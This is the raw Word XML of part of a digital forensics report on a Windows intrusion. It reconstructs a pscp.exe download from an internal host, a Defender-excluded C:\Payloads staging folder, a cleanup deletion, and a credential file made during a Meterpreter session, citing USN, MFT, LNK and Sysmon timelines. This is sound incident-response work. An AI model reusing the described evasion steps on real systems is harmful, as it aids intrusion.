        <w:t>- At 10:20:10.1169 C:\Payloads\pscp.exe is created (USN FileCreate, MFT entry 85781, 986,624 B). Its $SI Modified is 10:19:53.85, the same as the download, so it is a copy that kept its timestamps. It also kept the Zone.Identifier ADS (ZoneId=3, HostUrl=http://10.0.0.12:8080/pscp.exe).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:20:20.82 the Downloads copy (entry 85774) is renamed to $Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe, and $IHOVDEL.exe is created (entry 85783).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- RBCmd: original path C:\Users\medmondson\Downloads\pscp.exe, 986624 B, DeletedOn 10:20:20.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $MFT shows $RHOVDEL.exe still allocated, with a Zone.Identifier carrying the same HostUrl.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Edge TempState .partial files were deleted at 10:20:33.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Payloads\test.exe is created at 10:21:41 (entry 80578; F-009).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Explorer browsing of the folder: ShellBag 'This PC\C:\Payloads' (created 10:18:46, FirstInteracted 10:20:08) and Recent\Payloads.lnk (target C:\Payloads, target created 10:18:44, volume serial 026F16D0).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fact: $J, $MFT, the Recycle Bin $I file and ShellBags/LNK are independent sources, and they show the same sequence. C:\Payloads was created at 10:18:44 and then excluded from Defender. Defender removed the downloaded pscp.exe from Downloads twice. Once the exclusion was in place, the surviving download was copied with Explorer into C:\Payloads; it is a copy because the MFT entry is different (85781 vs 85774). The original was then deleted to the Recycle Bin. This was a cleanup step, not effective anti-forensics, because the file can still be recovered.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Forensic value:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $RHOVDEL.exe (MFT 85774) is a second on-disk copy of the payload. It has the same size and should have the same hash, but no hash for it was collected.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Zone.Identifier ADS on every copy keeps the origin, 10.0.0.12:8080.</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10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=85774-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87237</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:10.116914</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=85781-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87279</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20.820023</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=85774-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87301</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.768538</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=85540-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#85220</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.493383</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=85732-5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87189</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>size=986624 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IHOVDEL.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</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C:\Payloads\pscp.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Payloads</w:t>
              <w:br/>
              <w:t>machine=desktop-kj81a5a MAC=00:0c:29:27:f7:8f volume=026F16D0 Fixed storage media (Hard drive) size=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_C.csv#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\Payloads.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded) ; Folder: modified (recorded) ; Folder: accessed (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Payloads</w:t>
              <w:br/>
              <w:t>Directory Payloads MFT=80945 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/medmondson_UsrClass.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:26.178698</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Payloads</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=2 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-015: Plaintext credential file C:\Users\medmondson\Desktop\not_my_pass.txt created during the live Meterpreter session (credential exposure)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artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:lnk files</w:t>
              <w:br/>
              <w:t>artifact:registry: lastvisitedpidlmru</w:t>
              <w:br/>
              <w:t>artifact:registry: opensavepidlmru</w:t>
              <w:br/>
              <w:t>artifact:windows search (indexed files)</w:t>
              <w:br/>
              <w:t>artifact:windows timeline (activitiescache)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>credential access / user activity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1552.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200 → 2023-11-10 11:13:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>How the file was created:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:07:45.54 Explorer created C:\Users\medmondson\Desktop\New Text Document.txt (0 B, MFT entry 90503; USN FileCreate).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:07:47.90 Sysmon EID 1 (RecordID 330) records notepad.exe PID 932, GUID {e6e9f951-0f03-654e-aa01-000000000500}, command line "C:\Windows\system32\NOTEPAD.EXE" C:\Users\medmondson\Desktop\New Text Document.txt. Its parent is the user's interactive explorer.exe PID 2432, GUID {e6e9f951-0907-654e-5c00-000000000500}. It ran at Medium IL under LogonId 0x153A9, not the injected explorer 7324 under 0x15347.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:13:46 Security 4798 shows notepad.exe (CallerProcessId 0x3A4 = 932) enumerating medmondson's groups. This is typical of the Save As dialog.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:13:56.56 USN records not_my_pass.txt FileCreate/Delete, then a FileCreate+DataExtend at 11:13:56.73. $MFT entry 83576 shows 38 bytes, $SI Created 11:13:56.5568, Modified 11:13:56.7287, LastAccess 11:15:54.7287.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The same moment is recorded by:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - OpenSavePidlMRU (txt and *) 'This PC\Desktop\not_my_pass.txt', OpenedOn 11:13:56.5568</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - LastVisitedPidlMRU NOTEPAD.EXE → This PC\Desktop at 11:13:56</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - RecentDocs .txt MRU position 1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Recent\not_my_pass.txt.lnk (created 11:13:56.98)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
